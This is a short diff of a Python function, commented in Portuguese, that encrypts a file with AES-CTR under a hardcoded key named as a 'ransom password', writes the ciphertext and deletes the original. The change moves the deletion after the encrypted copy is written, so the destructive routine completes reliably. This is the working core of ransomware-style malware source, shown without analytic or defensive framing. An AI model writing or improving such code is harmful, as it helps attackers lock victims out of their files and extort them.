@@ -7,9 +7,6 @@ def encrypt(file_name):
     file_data = file.read()
     file.close()
 
-    ## remover o arquivo
-    os.remove(file_name)
-
     ## chave de criptografia
     key = b"senharesgate1111"
     aes = pyaes.AESModeOfOperationCTR(key)
@@ -22,4 +19,8 @@ def encrypt(file_name):
     new_file = open(f'{new_file}','wb')
     new_file.write(crypto_data)
     new_file.close()
+
+    ## remover o arquivo
+    os.remove(file_name)
+
     return 'encrypted!'
